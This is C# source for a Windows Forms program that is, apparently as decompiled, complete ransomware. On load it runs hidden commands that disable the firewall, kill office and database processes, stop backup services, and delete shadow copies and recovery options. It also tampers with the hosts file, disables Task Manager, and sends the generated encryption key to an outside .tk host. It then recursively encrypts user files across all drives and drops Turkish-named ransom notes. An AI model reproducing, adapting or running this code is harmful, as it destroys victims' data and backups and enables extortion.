using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Microsoft.Win32;
using _0xf4.Properties;

namespace _0xf4;

public class Form1 : Form
{
	private static Random random = new Random();

	private IContainer components;

	public Form1()
	{
		InitializeComponent();
	}

	public void EncryptDirectory(string location, string password)
	{
		try
		{
			string[] source = new string[24]
			{
				".txt", ".doc", ".docx", ".rar", ".zip", ".xls", ".bin", ".xlsx", ".ppt", ".pptx",
				".rtf", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp",
				".aspx", ".html", ".xml", ".psd"
			};
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (source.Contains(extension))
				{
					AES256.EncryptFile(files[i], password);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				EncryptDirectory(directories[j], password);
			}
		}
		catch (ArgumentException)
		{
		}
		catch (CryptographicException)
		{
		}
		catch (UnauthorizedAccessException)
		{
		}
		catch (IOException)
		{
		}
	}

	public void DecryptDirectory(string location, string password)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < files.Length; i++)
			{
				if (Path.GetExtension(files[i]) == AES256.EXTENSION)
				{
					AES256.DecryptFile(files[i], password);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				DecryptDirectory(directories[j], password);
			}
		}
		catch (ArgumentException)
		{
		}
		catch (CryptographicException)
		{
		}
		catch (UnauthorizedAccessException)
		{
		}
		catch (IOException)
		{
		}
	}

	public static void CMDCommand(string cmmnd)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			UseShellExecute = false,
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			FileName = "cmd.exe",
			Arguments = "/C " + cmmnd,
			RedirectStandardError = true,
			RedirectStandardOutput = true
		};
		process.Start();
		process.WaitForExit();
	}

	private static void createtextfilse(string filedir, string text)
	{
		try
		{
			if (File.Exists(filedir))
			{
				File.Delete(filedir);
			}
			using (FileStream fileStream = File.Create(filedir))
			{
				byte[] bytes = new UTF8Encoding(encoderShouldEmitUTF8Identifier: true).GetBytes(text);
				fileStream.Write(bytes, 0, bytes.Length);
			}
			using StreamReader streamReader = File.OpenText(filedir);
			string text2 = "";
			while ((text2 = streamReader.ReadLine()) != null)
			{
				Console.WriteLine(text2);
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.ToString());
		}
	}

	public static void ReplaceInFile(string filePath, string searchText, string replaceText)
	{
		StreamReader streamReader = new StreamReader(filePath);
		string input = streamReader.ReadToEnd();
		streamReader.Close();
		input = Regex.Replace(input, searchText, replaceText);
		StreamWriter streamWriter = new StreamWriter(filePath);
		streamWriter.Write(input);
		streamWriter.Close();
	}

	public static string RandomString(int length)
	{
		return new string((from s in Enumerable.Repeat("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", length)
			select s[random.Next(s.Length)]).ToArray());
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		CMDCommand("netsh firewall set opmode disable");
		CMDCommand("vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB");
		CMDCommand("vssadmin resize shadowstorage /for=C: /on=C: /maxsize=unbounded");
		CMDCommand("taskkill /f /im sql.* & taskkill /f /im winword.* & taskkill /f /im wordpad.* & taskkill /f /im outlook.* & taskkill /f /im thunderbird.* & taskkill /f /im oracle.* & taskkill /f /im excel.* & taskkill /f /im onenote.* & taskkill /f /im virtualboxvm.* & taskkill /f /im node.* & taskkill /f /im QBW32.* & taskkill /f /im WBGX.* & taskkill /f /im Teams.* & taskkill /f /im Flow.*");
		CMDCommand("net stop DbxSvc & net stop OracleXETNSListener & net stop OracleServiceXE & net stop AcrSch2Svc & net stop AcronisAgent & net stop Apache2.4 & net stop SQLWriter & net stop MSSQL$SQLEXPRESS & net stop MSSQLServerADHelper100 & net stop MongoDB & net stop SQLAgent$SQLEXPRESS & net stop SQLBrowser & net stop CobianBackup11 & net stop cbVSCService11 & net stop QBCFMontorService & net stop QBVSS");
		CMDCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet & wbadmin delete systemstatebackup & wbadmin delete systemstatebackup -keepversions:0 & wbadmin delete backup");
		File.Delete("C:\\Windows\\System32\\drivers\\etc\\host");
		createtextfilse("C:\\Windows\\System32\\drivers\\etc\\host", "127.0.0.1 validation.sls.microsoft.com");
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("DisableTaskMgr", "1");
		registryKey.Close();
		string text = RandomString(150);
		string text2 = RandomString(12);
		new WebClient().DownloadString("http://zaammmama.tk/SHwLFOP19dHNKMSJ2mXhN92ZcpOcAEz.php?vIrMpaVbm86WzXjtcxEsw4YQ1Syo0B9NvOSuTlKNTsD9ksoe3Y2QTKSWC9sr=ID:_" + text2 + "___Key:___" + text);
		if (Directory.Exists("D:\\"))
		{
			EncryptDirectory("D:\\", text);
		}
		if (Directory.Exists("A:\\"))
		{
			EncryptDirectory("A:\\", text);
		}
		if (Directory.Exists("B:\\"))
		{
			EncryptDirectory("B:\\", text);
		}
		if (Directory.Exists("F:\\"))
		{
			EncryptDirectory("F:\\", text);
		}
		if (Directory.Exists("G:\\"))
		{
			EncryptDirectory("G:\\", text);
		}
		if (Directory.Exists("H:\\"))
		{
			EncryptDirectory("H:\\", text);
		}
		if (Directory.Exists("I:\\"))
		{
			EncryptDirectory("I:\\", text);
		}
		if (Directory.Exists("J:\\"))
		{
			EncryptDirectory("J:\\", text);
		}
		if (Directory.Exists("K:\\"))
		{
			EncryptDirectory("K:\\", text);
		}
		if (Directory.Exists("L:\\"))
		{
			EncryptDirectory("L:\\", text);
		}
		if (Directory.Exists("M:\\"))
		{
			EncryptDirectory("M:\\", text);
		}
		if (Directory.Exists("N:\\"))
		{
			EncryptDirectory("N:\\", text);
		}
		if (Directory.Exists("O:\\"))
		{
			EncryptDirectory("O:\\", text);
		}
		if (Directory.Exists("P:\\"))
		{
			EncryptDirectory("P:\\", text);
		}
		if (Directory.Exists("R:\\"))
		{
			EncryptDirectory("R:\\", text);
		}
		if (Directory.Exists("S:\\"))
		{
			EncryptDirectory("S:\\", text);
		}
		if (Directory.Exists("T:\\"))
		{
			EncryptDirectory("T:\\", text);
		}
		if (Directory.Exists("U:\\"))
		{
			EncryptDirectory("U:\\", text);
		}
		if (Directory.Exists("V:\\"))
		{
			EncryptDirectory("V:\\", text);
		}
		if (Directory.Exists("W:\\"))
		{
			EncryptDirectory("W:\\", text);
		}
		if (Directory.Exists("X:\\"))
		{
			EncryptDirectory("X:\\", text);
		}
		if (Directory.Exists("Y:\\"))
		{
			EncryptDirectory("Y:\\", text);
		}
		if (Directory.Exists("Z:\\"))
		{
			EncryptDirectory("Z:\\", text);
		}
		if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Recent)))
		{
			EncryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Recent), text);
		}
		if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures)))
		{
			EncryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), text);
		}
		if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)))
		{
			EncryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic), text);
		}
		if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos)))
		{
			EncryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos), text);
		}
		if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Personal)))
		{
			EncryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Personal), text);
		}
		if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures)))
		{
			EncryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures), text);
		}
		if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic)))
		{
			EncryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic), text);
		}
		if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos)))
		{
			EncryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos), text);
		}
		if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments)))
		{
			EncryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments), text);
		}
		if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads"))
		{
			EncryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads", text);
		}
		if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)))
		{
			EncryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), text);
		}
		if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory)))
		{
			EncryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory), text);
		}
		if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)))
		{
			string text3 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Beni Oku!!!.txt";
			File.WriteAllText(text3, Resources.beni_oku);
			ReplaceInFile(text3, "XXXXXXXXXX", text2);
		}
		if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures)))
		{
			string text4 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + "\\Beni Oku!!!.txt";
			File.WriteAllText(text4, Resources.beni_oku);
			ReplaceInFile(text4, "XXXXXXXXXX", text2);
		}
		if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)))
		{
			string text5 = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + "\\Beni Oku!!!.txt";
			File.WriteAllText(text5, Resources.beni_oku);
			ReplaceInFile(text5, "XXXXXXXXXX", text2);
		}
		if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos)))
		{
			string text6 = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\Beni Oku!!!.txt";
			File.WriteAllText(text6, Resources.beni_oku);
			ReplaceInFile(text6, "XXXXXXXXXX", text2);
		}
		if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Personal)))
		{
			string text7 = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\Beni Oku!!!.txt";
			File.WriteAllText(text7, Resources.beni_oku);
			ReplaceInFile(text7, "XXXXXXXXXX", text2);
		}
		if (Directory.Exists("D:\\"))
		{
			File.WriteAllText("D:\\\\Beni Oku!!!.txt", Resources.beni_oku);
			ReplaceInFile("D:\\\\Beni Oku!!!.txt", "XXXXXXXXXX", text2);
		}
		if (Directory.Exists("C:\\"))
		{
			File.WriteAllText("C:\\\\Beni Oku!!!.txt", Resources.beni_oku);
			ReplaceInFile("C:\\\\Beni Oku!!!.txt", "XXXXXXXXXX", text2);
		}
		CMDCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet & wbadmin delete systemstatebackup & wbadmin delete systemstatebackup -keepversions:0 & wbadmin delete backup");
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).AutoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).AutoScaleMode = (AutoScaleMode)1;
		((Form)this).ClientSize = new Size(800, 450);
		((Control)this).Name = "Form1";
		((Control)this).Text = "Form1";
		((Form)this).Load += Form1_Load;
		((Control)this).ResumeLayout(false);
	}
}
